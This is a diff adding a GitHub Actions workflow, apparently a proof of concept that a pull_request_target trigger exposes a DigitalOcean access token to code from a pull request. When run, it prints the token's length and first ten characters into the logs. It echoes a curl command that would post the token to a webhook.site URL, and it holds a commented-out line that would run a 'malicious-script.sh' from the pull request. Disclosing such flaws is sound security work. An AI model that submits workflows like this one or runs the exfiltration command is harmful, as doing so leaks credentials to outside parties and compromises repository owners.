@@ -1,0 +1,53 @@
+name: Proof of Concept - Token Exfiltration
+
+on: [pull_request_target]
+
+jobs:
+  demonstrate_vulnerability:
+    runs-on: ubuntu-latest
+    steps:
+      # This checks out the PR code (attacker's code)
+      - name: Checkout PR code
+        uses: actions/checkout@v2
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      
+      # This step proves the vulnerability by accessing the secret
+      - name: Demonstrate Secret Access
+        env:
+          SECRET_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+        run: |
+          echo "================================================"
+          echo "VULNERABILITY DEMONSTRATED"
+          echo "================================================"
+          echo ""
+          echo "This workflow is running code from PR: #${{ github.event.pull_request.number }}"
+          echo "PR Author: ${{ github.event.pull_request.user.login }}"
+          echo "PR Branch: ${{ github.event.pull_request.head.ref }}"
+          echo ""
+          echo "Secret Access Proof:"
+          echo "- Token is accessible: YES"
+          echo "- Token length: ${#SECRET_TOKEN} characters"
+          echo "- Token preview: ${SECRET_TOKEN:0:10}..."
+          echo ""
+          echo "An attacker could exfiltrate this token by:"
+          echo "1. Making HTTP request to attacker-controlled server"
+          echo "2. Using curl, wget, or any HTTP client"
+          echo "3. Committing it to a different repo"
+          echo ""
+          echo "Example exfiltration command (NOT executed):"
+          echo "curl -X POST https://webhook.site/a043f82b-a3af-450a-8d32-12b1ea2babaf -d \"token=\$SECRET_TOKEN\""
+          echo ""
+          echo "================================================"
+          echo "This proves the workflow is vulnerable to"
+          echo "GitHub Actions Injection via pull_request_target"
+          echo "================================================"
+      
+      # Optional: Show we can execute arbitrary code from the PR
+      - name: Execute Code from PR
+        run: |
+          echo "Executing arbitrary code from PR..."
+          if [ -f "./malicious-script.sh" ]; then
+            echo "Found malicious script in PR - could execute it here"
+            # bash ./malicious-script.sh  # Uncommented, this would run attacker's code
+          fi
